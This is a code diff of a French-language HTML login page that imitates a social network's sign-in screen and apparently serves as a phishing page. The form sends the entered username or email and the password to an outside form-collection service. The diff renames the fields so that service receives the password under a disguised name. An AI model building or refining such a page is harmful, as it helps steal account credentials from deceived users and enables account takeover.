@@ -141,8 +141,10 @@
         </div>
         <h2>Connectez-vous pour voir les photos et vidéos de vos amis.</h2>
         <form action="https://forminit.com/f/1pgpfw848lr" method="POST">
-            <input type="text" name="fi-username" placeholder="Nom d'utilisateur, e-mail ou numéro de téléphone" required>
-            <input type="password" name="fi-password" placeholder="Mot de passe" required>
+            <!-- Utilise fi-sender-email ou fi-sender-phone -->
+            <input type="email" name="fi-sender-email" placeholder="Nom d'utilisateur, e-mail ou numéro de téléphone" required>
+            <!-- Mot de passe (optionnel, mais non sécurisé pour stockage réel) -->
+            <input type="password" name="fi-text-message" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
         </form>
         <div class="divider">
